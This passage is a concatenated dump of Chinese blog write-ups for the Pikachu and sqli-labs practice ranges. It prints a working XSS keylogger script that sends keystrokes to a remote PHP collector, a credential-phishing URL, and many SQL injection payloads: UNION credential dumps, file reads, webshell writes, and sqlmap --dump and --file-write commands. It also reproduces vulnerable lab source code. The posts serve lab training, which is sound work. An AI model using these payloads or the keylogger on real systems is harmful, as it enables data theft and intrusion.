http://192.168.1.15/pkxss/xfish/xfish.php?username=&#123;$_SERVER[PHP_AUTH_USER]&#125;&amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;&quot;);&#125;?&gt;\n键盘记录\n在实施之前先来了解一下–跨域：\n\n举例：https://fanyi.baidu.com/#en/zh/admin其中，协议（https:&#x2F;&#x2F;）、子域名（fanyi）、主域名（baidu.com）、端口（未显示，即默认的80端口）、资源地址（#en&#x2F;zh&#x2F;admin）。当这些组合间存在任一不同时，则形成不同域，而不同域间请求数据被称为跨域。\n\n都了解了跨越，那也了解下–同源策略\n\n出于安全考虑，各浏览器间约定同源策略，即不同域间不允许相互使用 JavaScript 操作。总有那么一些需要，导致跨域操作的出现，下边举几个例子：\n&lt;script src=&quot;...&quot;&gt;\t\t# script 标签，定义客户端脚本，包含脚本语句，或使用 src 属性写入外部脚本文件&lt;img src=&quot;...&quot;&gt;\t\t\t# img 标签，加载图片&lt;link href=&quot;...&quot;&gt;\t\t# link 标签，加载 css 代码&lt;iframe src=&quot;...&quot;&gt;\t\t# iframe 标签，在当前 HTML 文档中嵌入另一个文档\n# http://192.168.135.130:49154/pkxss/rkeypress/rkserver.php 源码##&lt;?php/** * Created by runner.han * There is nothing new under the sun */include_once &#x27;../inc/config.inc.php&#x27;;include_once &#x27;../inc/mysql.inc.php&#x27;;$link=connect();//设置允许被跨域访问header(&quot;Access-Control-Allow-Origin:*&quot;);$data = $_POST[&#x27;datax&#x27;];$query = &quot;insert keypress(data) values(&#x27;$data&#x27;)&quot;;$result=mysqli_query($link,$query);?&gt;\n# http://192.168.135.130:49154/pkxss/rkeypress/rk.js 源码## 实现获取键盘记录的js脚本## 存储型xss处写入如下语句：&lt;script src= &quot;http://192.168.135.130:49154/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;# 似乎没啥呀？F12一波，发现我们的js脚本执行报错：ReferenceError: event is not definedhttp://192.168.135.130:49154/pkxss/rkeypress/rk.jsLine 34# 就这行的内容：var realkey = String.fromCharCode(event.keyCode);# event 未定义？不了解js，找度娘玩呗：# 度娘说：FireFox没有 window.event# 其他网友说 onkeypress 函数内加下面这句话：var event = window.event || arguments.callee.caller.arguments[0];# 恭喜，得到一个新错误：TypeError: arguments.callee.caller is null# 继续，似乎说是严格模式下报错，火狐不支持callee、caller的+用法# ……找不到门径，放弃使用FireFox，拿Google访问吧。# 测试发现，仅在英文模式下输入有效，中文没用呀，# 看了下，还是理解一波先/*\tIE7+、Firefox、Chrome、Safari 以及 Opera 内建 XMLHttpRequest 对象\t使用js创建ajax对象时，通过 window.XMLHttpRequest 进行判断。  XMLHttpRequest 对象用于在后台与服务器交换数据。  XMLHttpRequest 的 overrideMimeType 方法是指定一个MIME类型用于替代服务器指定的类型，使服务端响应信息中传输的数据按照该指定MIME类型处理。即针对某些特定版本的mozillar浏览器的BUG进行修正，使正常运行。  request.overrideMimeType(&#x27;text/xml&#x27;); 语句将覆盖发送给服务器的头部，强制 text/xml 作为 mime-type。    老版本的 Internet Explorer （IE5 和 IE6）使用 ActiveX 对象  window.ActiveXObject 用来判断浏览器是否支持ActiveX控件    fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。*//*\t说下我的理解：  自定义 createAjax() 函数用于创建 XMLHttpRequest 对象，根据兼容性使用不同的方法创建。  如通过 window.XMLHttpRequest 判读是否内置 XMLHttpRequest ；没有再通过 window.ActiveXObject 判断 ActiveXObject 的内置    自定义 onkeypress() 函数用于监听键盘事件。  其中，使用到 fromCharCode() 函数，这也是为什么不能使用中文输入法的原因。  将获取的键入值不断拼接 xl ，实现键盘记录。    自定义 show() 函数，先调用 函数创建 。  其中，内部又定义了一个匿名函数，进行请求的各种判断：  如 ajax.readyState == 4 服务器响应完成  ajax.status == 200 请求成功处理  ajax.responseText 读取服务器返回的内容    最后  利用 open() 打开我们的远程服务器进行数据的存储  通过 setRequestHeader 设置请求头  利用 send() 把获取到的数据发送远程服务器    还是看一下 Ajax 的 XMLHttpRequest 对象的功能吧  - 在不重新加载页面的情况下更新网页\t- 在页面已加载后从服务器请求数据\t- 在页面已加载后从服务器接收数据\t- 在后台向服务器发送数据  *//** * Created by runner on 2018/7/8. */function createAjax()&#123;    var request=false;    if(window.XMLHttpRequest)&#123;        request=new XMLHttpRequest();        if(request.overrideMimeType)&#123;            request.overrideMimeType(&quot;text/xml&quot;);        &#125;    &#125;else if(window.ActiveXObject)&#123;        var versions=[&#x27;Microsoft.XMLHTTP&#x27;, &#x27;MSXML.XMLHTTP&#x27;, &#x27;Msxml2.XMLHTTP.7.0&#x27;,&#x27;Msxml2.XMLHTTP.6.0&#x27;,&#x27;Msxml2.XMLHTTP.5.0&#x27;, &#x27;Msxml2.XMLHTTP.4.0&#x27;, &#x27;MSXML2.XMLHTTP.3.0&#x27;, &#x27;MSXML2.XMLHTTP&#x27;];        for(var i=0; i&lt;versions.length; i++)&#123;            try&#123;                request=new ActiveXObject(versions[i]);                if(request)&#123;                    return request;                &#125;            &#125;catch(e)&#123;                request=false;            &#125;        &#125;    &#125;    return request;&#125;var ajax=null;var xl=&quot;datax=&quot;;function onkeypress() &#123;    var realkey = String.fromCharCode(event.keyCode);    xl+=realkey;    show();&#125;document.onkeypress = onkeypress;function show() &#123;    ajax = createAjax();    ajax.onreadystatechange = function () &#123;        if (ajax.readyState == 4) &#123;            if (ajax.status == 200) &#123;                var data = ajax.responseText;            &#125; else &#123;                alert(&quot;页面请求失败&quot;);            &#125;        &#125;    &#125;    var postdate = xl;    ajax.open(&quot;POST&quot;, &quot;http://192.168.1.15/pkxss/rkeypress/rkserver.php&quot;,true);    ajax.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);    ajax.setRequestHeader(&quot;Content-length&quot;, postdate.length);    ajax.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);    ajax.send(postdate);&#125;\n# http://192.168.135.130:49154/pkxss/rkeypress/pkxss_keypress_result.php 源码## 接受键盘输入界面&lt;?php// error_reporting(0);include_once &#x27;../inc/config.inc.php&#x27;;include_once &#x27;../inc/mysql.inc.php&#x27;;$link=connect();// 判断是否登录，没有登录不能访问if(!check_login($link))&#123;    header(&quot;location:../pkxss_login.php&quot;);&#125;if(isset($_GET[&#x27;id&#x27;]) &amp;&amp; is_numeric($_GET[&#x27;id&#x27;]))&#123;    $id=escape($link, $_GET[&#x27;id&#x27;]);    $query=&quot;delete from keypress where id=$id&quot;;    execute($link, $query);&#125;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;键盘记录结果&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../antxss.css&quot; /&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;title&quot;&gt;&lt;h1&gt;pikachu Xss 获取键盘记录结果&lt;/h1&gt;&lt;a href=&quot;../xssmanager.php&quot;&gt;返回首页&lt;/a&gt;&lt;/div&gt;&lt;div id=&quot;xss_main&quot;&gt;&lt;table border=&quot;1px&quot; cellpadding=&quot;10&quot; cellspacing=&quot;1&quot; bgcolor=&quot;#5f9ea0&quot;&gt;    &lt;tr&gt;        &lt;td&gt;id&lt;/td&gt;        &lt;td&gt;记录&lt;/td&gt;        &lt;td&gt;操作&lt;/td&gt;    &lt;/tr&gt;    &lt;?php     $query=&quot;select * from keypress&quot;;    $result=mysqli_query($link, $query);    while($data=mysqli_fetch_assoc($result))&#123;$html=&lt;&lt;&lt;A    &lt;tr&gt;        &lt;td&gt;&#123;$data[&#x27;id&#x27;]&#125;&lt;/td&gt;        &lt;td&gt;&#123;$data[&#x27;data&#x27;]&#125;&lt;/td&gt;        &lt;td&gt;&lt;a href=&quot;pkxss_keypress_result.php?id=&#123;$data[&#x27;id&#x27;]&#125;&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;    &lt;/tr&gt;A;                 echo $html;                    &#125;        ?&gt;    &lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n后记\n\n练着是那么回事，写着又是那么回事，总觉得太乱了。\n笔者感觉，整体打完一个靶场和到处打一下效果是截然不同的，更容易可看出不足。\n人生短暂，且行且努力，加油~\n\n\n","categories":["靶场"],"tags":["通关","pikachu"]},{"title":"sqli-labs之Less-1","url":"/article/16ddc750.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/article/16ddc750.html\n\n0x00 Error Based- String根据提示写入/?id=1，还是直接给它写/?id=1&#39;明显可以看出，由于多了一个&#39;，导致 SQL 语句后面的LIMIT 0,1&#39;无法执行造成语法错误由此，完全可以判定为字符型注入，且其数据库为MySQL\n0x01 ORDER BY判定利用 SQL 中的注释符将LIMIT 0,1&#39;注释，用--+或%23可以成功注释写入/?id=1%27%20ORDER%20BY%204%23，推测有3个字段注：“–”与注释内容间空格隔开才会生效“–+”在语句运行时”+”将变成空格，间隔开后面的字符使注释生效mysql数据库中可使用”#”进行注释，有无空格皆可，可转义为%23避免与URL本身的锚点冲突\n\n# 拼接/?id=-1&#x27; UNION SELECT 1,database(),3%23\t# 当前数据库/?id=-1&#x27; UNION SELECT 1,version(),3%23\t# 数据库版本/?id=-1&#x27; UNION SELECT 1,user(),3%23\t# 当前连接账户# 一次性显示# concat_ws()：一次性指定分隔符，将多个字符串拼接成一个字符串# char(32,58,32)：ASCII码，分别表示空格冒号空格/?id=-1&#x27; union select 1,2,concat_ws(char(32,58,32),user(),database(),version())%23\n可以看到，拼接/?id=1&#39; UNION SELECT 1,2,3%23时，UNION后面语句压根没有执行，也可以说没有位置给它再显示出来了。修改为/?id=-1&#39; UNION SELECT 1,2,3%23，使UNION前面语句错误，让位给后面语句显示根据结果，字段1设置了默认值Dhakkan，故只可在后面两个字段构造语句来显示待获取值\n\n# 语句解析访问链接：https://0xtlu.github.io/article/39c9e418.html# 获取当前表下账密/?id=-1&#x27; union select 1,2,concat_ws(char(32,58,32),username,password) from users%23# 查询所有数据库/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata%23# 查询security数据库下所有表/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;%23# 查询security数据库（转十六进制）下所有表/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479%23# 查询security数据库下所有字段/?id=-1&#x27; union select 1,2,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS WHERE TABLE_SCHEMA=&#x27;security&#x27;)%23# 读取该题源码文件，检查页面源代码可以看到全部源码/?id=-1&#x27; union select 1,2,load_file(&#x27;/var/www/html/Less-1/index.php&#x27;)%23# 文件写入，对应路径：/var/lib/mysql/11.php，可惜无法目录遍历，访问不了# 其他路径：Can&#x27;t create/write to file &#x27;/var/www/html/Less-1/11.php&#x27; (Errcode: 13)/?id=-1&#x27; union select 1,&quot;111&quot;,2 into outfile &#x27;./11.php&#x27;%23# 或/?id=1&#x27; into outfile &#x27;/tmp/111.php&#x27; fields terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+\n\n\n0x03 SQLMap使用#　-v\t\t详细的等级(0-6)# 列举数据库sqlmap -u &#x27;http://192.168.184.129:49154/Less-1/?id=1&#x27; -v 1 --dbs# 当前数据库sqlmap -u &#x27;http://192.168.184.129:49154/Less-1/?id=1&#x27; -v 1 –-current-db# 列数据库用户sqlmap -u &#x27;http://192.168.184.129:49154/Less-1/?id=1&#x27; -v 1 –-users# 列举数据库的表名sqlmap -u &#x27;http://192.168.184.129:49154/Less-1/?id=1&#x27; -v 1 –D &#x27;security&#x27; –-tables# 获取表的列名sqlmap -u &#x27;http://192.168.184.129:49154/Less-1/?id=1&#x27; -v 1 –D &#x27;security&#x27; -T &#x27;users&#x27; –-columns# 获取表中的数据sqlmap -u &#x27;http://192.168.184.129:49154/Less-1/?id=1&#x27; -v 1 –D &#x27;security&#x27; -T &#x27;users&#x27; -C &#x27;username,password&#x27; –-dump# 读取文件sqlmap -u &#x27;http://192.168.184.129:49154/Less-1/?id=1&#x27; -v 1 --file-read &#x27;/var/www/html/Less-1/index.php&#x27;# 写文件，此处不成功sqlmap -u &#x27;http://192.168.184.129:49154/Less-1/?id=1&#x27; -v 1 –file-write &#x27;/home/kali/shell.php&#x27; –file-dest &#x27;/var/www/html/Less-1/1.php&#x27;\n\n\n0x04 源码分析\nisset()函数检测变量 $_GET[&#39;id&#39;] 是否已声明并且其值不为 null\n赋予变量 $id 后，将之追加到 result.txt 文件中，并直接拼入 SQL 语法中\nmysql_query() 函数发送一条拼接好的 MySQL 查询语句\nmysql_fetch_array() 函数从结果集中取得一行作为数字数组或关联数组；不返回 false 则在网页中打印 username 和 password，反之，mysql_error() 函数将返回上一个 MySQL 操作产生的文本错误信息&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variables if(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);\tif($row)\t&#123;  \techo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;  \techo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];  \techo &quot;&lt;br&gt;&quot;;  \techo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];  \techo &quot;&lt;/font&gt;&quot;;  \t&#125;\telse \t&#123;\techo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;\tprint_r(mysql_error());\techo &quot;&lt;/font&gt;&quot;;  \t&#125;&#125;\telse &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-1.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;\n\n0x05 疑难解答\nURL 中拼入/?id=-1&#39; union select 1,&quot;111&quot;,2 into outfile &#39;/var/www/html/11.php&#39;%23时，出现报错：Can&#39;t create/write to file &#39;/var/www/html/11.php&#39; (Errcode: 13)\n查看允许导入导出的路径：show global variables like &#39;%secure_file_priv%&#39;;为空，未对 mysqld 的导入|导出做限制\n查看数据文件存放位置：show variables like &#39;datadir&#39;;，限定于/var/lib/mysql/\n按我的理解，这可以任意读写文件的，但就是这写，不行呀。通过比对发现，仅有其他用户的权限提供了写权限，方能写入文件，如 &#x2F;tmp的权限为drwxrwxrwt。\n这我是其它用户呀！之前查询当前连接mysql的用户是root@localhost，而不是直接连接系统的root\n有点懂了，mysql账户来连接shell终端，cat /etc/passwd看下mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false，第3和4个参数分别为用户id和组id，都大于100，则为程序用户，拥有一些低权限。\n查看mysql用户所在组及其组成员：groups mysql，得到mysql : mysql；而/var/www/html的属主为root；两相对比，可知mysql用户相对root而言必然是其他用户\n注：UID的值为0时，表示系统管理员；（1-99）为系统预设账号；（100-499）保留给一些服务使用；（500-65535）给一般使用者使用\n\n\n","categories":["靶场"],"tags":["通关","sqli-labs"]},{"title":"sqli-labs之Less-2","url":"/article/8fd496ea.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/article/8fd496ea.html\n\n0x00 类型确定直接写入/?id=1&#39;，得到报错&#39; LIMIT 0,1；为证实为数字型，再使用and 1=1验证，正常显示，若使用and 1=2无账密显示，由此，完全可以确认为数字型注入。\nhttp://192.168.184.129:49154/Less-2/?id=1&#x27;http://192.168.184.129:49154/Less-2/?id=1 and 1=1\n\n0x01 简单几句基本和Less1一致，就少了单引号，访问笔记：sqli-labs之Less-1\n# 读取到的文件如何查看：view-source:网址view-source:http://192.168.184.129:49154/Less-2/?id=-1%20union%20select%201,2,load_file(%27/var/www/html/Less-2/index.php%27)%23\n\n0x02 分析源码还是和Less1一致，懒得分析了，直接访问笔记：sqli-labs之Less-1\n&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);\tif($row)\t&#123;  \techo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;  \techo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];  \techo &quot;&lt;br&gt;&quot;;  \techo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];  \techo &quot;&lt;/font&gt;&quot;;  \t&#125;\telse \t&#123;\techo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;\tprint_r(mysql_error());\techo &quot;&lt;/font&gt;&quot;;  \t&#125;&#125;\telse\t\t&#123; \t\t\techo &quot;Please input the ID as parameter with numeric value&quot;;\t\t&#125;?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-2.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;/font&gt;\n","categories":["靶场"],"tags":["通关","sqli-labs"]},{"title":"sqli-labs之Less-3","url":"/article/f8d3a67c.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/article/f8d3a67c.html\n\n0x00 万能的单引号写入/?id=1&#39;存在报错&#39;1&#39;&#39;) LIMIT 0,1。3个引号，1&#39;是我写入，那就是单引号没成对构成错误。同时，可以知道传入的id被小括号括起来，也可能不止。故，在后面进行注释符写入时需要补上右半边小括号。\nhttp://192.168.184.129:49154/Less-3/?id=1%27\n\n0x01 构造闭合查看其他语句，直接访问笔记：sqli-labs之Less-1\nhttp://192.168.184.129:49154/Less-3/?id=1%27)%23http://192.168.184.129:49154/Less-3/?id=-1&#x27;) union select 1,2,load_file(&#x27;/var/www/html/Less-3/index.php&#x27;) --+http://192.168.184.129:49154/Less-3/?id=-1&#x27;) union select 1,2,load_file(&#x27;/var/www/html/Less-3/index.php&#x27;)%23\n\n0x02 源码分析果然是对进行单引号和括号包裹，但其他还是和Less1一致，直接访问笔记：sqli-labs之Less-1\n&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);\tif($row)\t&#123;  \techo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;  \techo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];  \techo &quot;&lt;br&gt;&quot;;  \techo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];  \techo &quot;&lt;/font&gt;&quot;;  \t&#125;\telse \t&#123;\techo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;\tprint_r(mysql_error());\techo &quot;&lt;/font&gt;&quot;;  \t&#125;&#125;\telse &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-3.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;/font&gt;\n","categories":["靶场"],"tags":["通关","sqli-labs"]},{"title":"sqli-labs之Less-4","url":"/article/66b733df.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/article/66b733df.html\n\n0x00 万能的引号默默的继续单引号测试，居然没返回，没错误没数据……改用它的兄弟双引号，拿到错误&quot;1&quot;&quot;) LIMIT 0,1，和Less3一值，仅是单引号改变双引号\nhttp://192.168.184.129:49154/Less-4/?id=1&quot;\n\n0x01 构造闭合其他直接访问笔记：sqli-labs之Less-1\nhttp://192.168.184.129:49154/Less-4/?id=-1&quot;) union select 1,2,concat_ws(char(32,58,32),user(),database(),version())%23%23\n\n0x02 源码分析\n目光转至以下代码块的第16行，在 php 中是通过点连接符对双引号和前端传入的id值进行拼接\n在接入 SQL 语句时，仍使用小括号对修改后参数进行包括，起到简单防护，其他继续看：sqli-labs之Less1&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);\tif($row)\t&#123;  \techo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;  \techo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];  \techo &quot;&lt;br&gt;&quot;;  \techo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];  \techo &quot;&lt;/font&gt;&quot;;  \t&#125;\telse \t&#123;\techo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;\tprint_r(mysql_error());\techo &quot;&lt;/font&gt;&quot;;  \t&#125;&#125;\telse &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-4.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;/font&gt;\n\n","categories":["靶场"],"tags":["通关","sqli-labs"]},{"title":"sqli-labs之Less-5","url":"/article/11b00349.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/article/11b00349.html\n\n0x00 常规操作如下第一个语句，id值直到为13后，仅显示欢迎。老老实实添入单引号，报错&#39;1&#39;&#39; LIMIT 0,1嗯，id带入数据库，字符型，先猜字段数吧，不可能变的，3个字段还是试试老套路，打死就是输出You are in...........，确定是盲注。\nhttp://192.168.184.129:49160/Less-5/?id=13http://192.168.184.129:49160/Less-5/?id=13&#x27;# 猜字段数http://192.168.184.129:49160/Less-5/?id=1&#x27; order by 4 %23# 真没注意这个可以用作猜字段，UNION 连接时，SELECT关键字中字段个数不对直接报错http://192.168.184.129:49160/Less-5/?id=1&#x27; union select 1,6,5,3 %23\n\n0x01 Boolean 注入AND命令与WHERE一起使用，若AND关键字两边成立，则显示正确提示，如此处为You are in………..，反之为空这下面两条语句……建议写工具爆破猜想：比如第一条语句的构造，字符字典需涵括大小字母、数字、点、杠、@等；第二条语句是测用户名长度则需要数字就好；举例root@localhost，至少14位，保险起见还是从0开始爆破。\n# 爆破语句构造，修改数字3和等号后的字符5，能单个猜想http://192.168.184.129:49160/Less-5/?id=1&#x27; AND SUBSTR(VERSION(),3,1)=&#x27;5&#x27; %23# 猜想数据库名的第2个字符是否为字符e，若是则成立，显示You are in...........http://192.168.184.129:49160/Less-5/?id=1&#x27; AND MID(DATABASE(),2,1)=&#x27;e&#x27; %23http://192.168.184.129:49160/Less-5/?id=1&#x27; AND SUBSTR(DATABASE(),2,1)=&#x27;e&#x27; %23http://192.168.184.129:49160/Less-5/?id=1&#x27; AND SUBSTRING(DATABASE(),2,1)=&#x27;e&#x27; %23# 单个字符转ASCII码，直接改变数值2和101，如2位于外循环，101位于内循环，最后对照ASCII表，或使用CHAR()方法http://192.168.184.129:49154/Less-5/?id=1&#x27; AND ORD(MID(DATABASE(),2,1))=101 %23# 猜想到用户名http://192.168.184.129:49160/Less-5/?id=1&#x27; AND LEFT(USER(),4)=&#x27;root&#x27; %23# 猜想到sql版本http://192.168.184.129:49160/Less-5/?id=1&#x27; AND LEFT(VERSION(),1)=&#x27;5&#x27; %23# 测长度，直接爆破数字就好，测当前用户名长度http://192.168.184.129:49160/Less-5/?id=1&#x27; AND LENGTH(USER())=14 %23# 测数据库名长度，方便之后的爆破，http://192.168.184.129:49154/Less-5/?id=1&#x27; AND LENGTH(DATABASE())&gt;=8 %23\n# 获取字符串str左边len个字符LEFT(str,len)# 从pos位序开始截取字符串str的len个字符MID(str,pos,len)# 从pos位序开始截取字符串str的len个字符SUBSTR(str FROM pos FOR len)# 从pos位序开始截取字符串str的len个字符SUBSTRING(str FROM pos FOR len)# 获取字符串str的长度LENGTH(str)# 返回字符串str的最左面字符的ASCII代码值ASCII(str)# 如果str最左边的字符是一个多字节字符，则返回多字节字符代码；反之，则返回与ASCII()函数返回的相同值ORD(str)# 根据ASCII表中的十进制int，转换为相应的字符CHAR(int)\n\n0x02 报错注入AND 关键字猜想，有点狠，得慢慢爆破猜想。既然语法错误信息还是会返回前端的，那肯定得试一把报错注入。\nupdatexml():mysql对xml文档数据进行查询和修改的xpath函数extractvalue()：mysql对xml文档数据进行查询的xpath函数floor():mysql中用来取整的函数exp():此函数返回e(自然对数的底)指数X的幂值 \n# updatexml()--最长输出32位且返回类型不为xml格式方有效# UPDATEXML(XML_document, XPath_string, new_value)# mysql对xml文档数据进行查询和修改的xpath函数# 当参数2为不满足 XPath 格式的字符串时，则在数据库中执行该语句时将返回参数2；# 若参数2中含有SQL语句，则返回的是参数2中SQL语句执行后的结果http://192.168.184.129:49154/Less-5/?id=1&#x27; or updatexml(1,concat(0x7e,(concat_ws(&#x27;;&#x27;,user(),version())),0x7e),0) or &#x27;http://192.168.184.129:49154/Less-5/?id=1&#x27; or updatexml(1,concat(0x7e,(MID(concat_ws(&#x27;;&#x27;,user(),version(),database()),15,32)),0x7e),0) or &#x27;# extractvalue()--输出限制32位字符# EXTRACTVALUE(XML_document, XPath_string)# mysql对xml文档数据进行查询的xpath函数# 当参数2为不满足 XPath 格式的字符串时，则在数据库中执行该语句时将返回参数2；# 若参数2中含有SQL语句，则返回的是参数2中SQL语句执行后的结果http://192.168.184.129:49154/Less-5/?id=1&#x27; or extractvalue(1,(CONCAT(&#x27;~&#x27;,DATABASE(),&#x27;~&#x27;))) or &#x27;http://192.168.184.129:49154/Less-5/?id=1&#x27; or extractvalue(1,(SELECT GROUP_CONCAT(&#x27;~&#x27;,TABLE_NAME,&#x27;~&#x27;) FROM information_schema.TABLES WHERE TABLE_SCHEMA = database())) or &#x27;# exp()--此函数支持较长报错输出# EXP(X)# 此函数返回e(自然对数的底)到X次方的值# 当参数x大于709时，EXP(x)引发溢出错误# 又，0按位取反得：18446744073709551615，加之函数成功执行时返回值为0# 函数执行成功返回值取反后与EXP()函数结合构成一处错误，则整个EXP()伴随报错显示出来# SELECT EXP(~(SELECT DATABASE()))# SELECT DATABASE() 成功执行返回0，取反后作为EXP()的参数，大于709造成溢出错误，报错：&gt; DOUBLE value is out of range in &#x27;exp(~(database()))&#x27;http://192.168.184.129:49154/Less-5/?id=1&#x27; UNION SELECT 1,1,EXP(~(SELECT * FROM (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS)x))%23http://192.168.184.129:49154/Less-5/?id=1&#x27; OR EXP(~(SELECT * FROM (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_name=&#x27;uagents&#x27;)x))%23\n\n0x03 二次查询注入看题目可知，该题实际考验二次查询注入。如下文，笔者的理解为：通过子句将恶意代码存入数据库临时表，再从临时表中进行查找。注：需满足 CONT()、GROUP BY、FLOOR()、RAND()  方可构成注入条件。\n# floor()--输出限制64位字符# FLOOR(X)# mysql中用来取整的函数# 0 &lt;= RAND() &lt; 1# GROUP BY 语句：根据一个或多个列对结果集进行分组# COUNT() 函数：返回匹配指定条件的行数# !!!主要利用：查询中 ORDER BY 或 GROUP BY 子句含 RAND() 时，# RAND() 会对同一记录重复求值，且返回不同结果。# !!!举例：SELECT COUNT(*) FROM users GROUP BY FLOOR(RAND(0)*2);# 执行子句 FLOOR(RAND(0)*2) 时，需将其值与临时表中主键比对是否重复，# 不重复则多执行一次 FLOOR(RAND(0)*2) 并将其值插入临时表，反之则个数叠加，# 由于 